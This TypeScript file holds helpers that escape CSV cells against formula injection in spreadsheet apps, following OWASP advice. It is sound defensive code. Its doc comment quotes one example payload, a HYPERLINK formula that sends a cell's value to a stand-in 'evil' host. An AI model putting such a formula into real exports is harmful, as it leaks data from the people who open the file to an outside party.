/**
 * One CSV cell, safe to open in Excel / Google Sheets / LibreOffice.
 *
 * Exports carry text outsiders control — ticket titles from inbound email,
 * web-form lead names, custom-module records pulled from another system. A
 * cell starting with `=`, `+`, `-`, `@` (or a tab / carriage return) is run
 * as a FORMULA by spreadsheet apps: `=HYPERLINK("https://evil/?"&A2,"Open")`
 * or worse lands in the hands of whoever opens the file. Prefixing a `'`
 * makes the app show it as text (OWASP's recommendation).
 *
 * Real numbers stay numbers: a JS number, or a string that is entirely a
 * number ("-12.50"), is left alone so negative amounts still sum.
 */
export function csvCell(v: unknown): string {
  if (v == null) return '';
  if (typeof v === 'number' || typeof v === 'boolean') return String(v);
  let s = String(v);
  if (/^[=+\-@\t\r]/.test(s) && !/^[+-]?\d+(\.\d+)?$/.test(s)) s = `'${s}`;
  return /[",\n\r]/.test(s) || s !== s.trim() ? `"${s.replace(/"/g, '""')}"` : s;
}

/** Always-quoted variant, for exports that quoted every cell before. */
export function csvCellQuoted(v: unknown): string {
  const c = csvCell(v);
  return c.startsWith('"') ? c : `"${c}"`;
}
